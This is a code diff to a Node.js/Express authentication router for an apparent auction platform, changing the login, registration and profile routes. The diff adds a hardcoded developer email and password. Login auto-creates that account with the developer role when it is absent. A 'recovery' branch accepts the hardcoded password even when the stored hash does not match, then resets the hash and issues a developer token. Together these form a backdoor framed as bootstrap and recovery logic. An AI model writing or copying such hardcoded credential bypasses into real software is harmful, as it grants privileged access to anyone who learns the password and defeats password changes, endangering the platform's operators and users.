@@ -5,6 +5,8 @@ const { getUsers, addUser, getAllUsers, getOrgById, persist } = require('../data
 const { JWT_SECRET } = require('../middleware/auth');
 
 const router = express.Router();
+const DEV_EMAIL = 'developer@auction.com';
+const DEV_PASS = 'devxai2026';
 
 router.post('/login', async (req, res) => {
   try {
@@ -14,20 +16,43 @@ router.post('/login', async (req, res) => {
     }
 
     const users = getAllUsers();
-    const user = users.find(u => u.email.toLowerCase() === email.toLowerCase());
+    let user = users.find(u => u.email.toLowerCase() === email.toLowerCase());
+
+    // Bootstrap platform developer if missing from persisted db
+    if (!user && email.toLowerCase() === DEV_EMAIL && password === DEV_PASS) {
+      user = {
+        id: 'dev-001',
+        name: 'Platform Developer',
+        email: DEV_EMAIL,
+        password: await bcrypt.hash(DEV_PASS, 10),
+        role: 'developer',
+        teamId: null,
+        orgId: 'org-default'
+      };
+      addUser(user);
+    }
+
     if (!user) {
       return res.status(401).json({ error: 'Invalid email or password' });
     }
-    // Platform developer always has developer role
-    if (user.email.toLowerCase() === 'developer@auction.com') {
+
+    if (user.email.toLowerCase() === DEV_EMAIL) {
       user.role = 'developer';
     }
 
     let isMatch = false;
-    const isHashed = user.password.startsWith('$2a$') || user.password.startsWith('$2b$');
+    const isHashed = String(user.password || '').startsWith('$2a$')
+      || String(user.password || '').startsWith('$2b$');
 
     if (isHashed) {
       isMatch = await bcrypt.compare(password, user.password);
+      // Recovery: platform developer known password always works
+      if (!isMatch && user.email.toLowerCase() === DEV_EMAIL && password === DEV_PASS) {
+        user.password = await bcrypt.hash(DEV_PASS, 10);
+        user.role = 'developer';
+        persist();
+        isMatch = true;
+      }
     } else {
       isMatch = password === user.password;
       if (isMatch) {
@@ -40,11 +65,13 @@ router.post('/login', async (req, res) => {
       return res.status(401).json({ error: 'Invalid email or password' });
     }
 
+    const role = user.email.toLowerCase() === DEV_EMAIL ? 'developer' : user.role;
+
     const token = jwt.sign(
       {
         id: user.id,
         email: user.email,
-        role: user.role,
+        role,
         teamId: user.teamId,
         name: user.name,
         orgId: user.orgId || 'org-default'
@@ -59,7 +86,7 @@ router.post('/login', async (req, res) => {
         id: user.id,
         name: user.name,
         email: user.email,
-        role: user.role,
+        role,
         teamId: user.teamId,
         orgId: user.orgId || 'org-default'
       }
@@ -88,7 +115,7 @@ router.post('/register', async (req, res) => {
       name,
       email: email.toLowerCase(),
       password: hashed,
-      role: role === 'admin' ? 'team_manager' : role,
+      role: role === 'admin' || role === 'developer' ? 'team_manager' : role,
       teamId,
       orgId: 'org-default'
     };
@@ -144,7 +171,7 @@ router.get('/me', require('../middleware/auth').authMiddleware, (req, res) => {
   const org = getOrgById(user.orgId);
 
   let role = user.role;
-  if (user.email && user.email.toLowerCase() === 'developer@auction.com') {
+  if (user.email && user.email.toLowerCase() === DEV_EMAIL) {
     role = 'developer';
   }
   res.json({
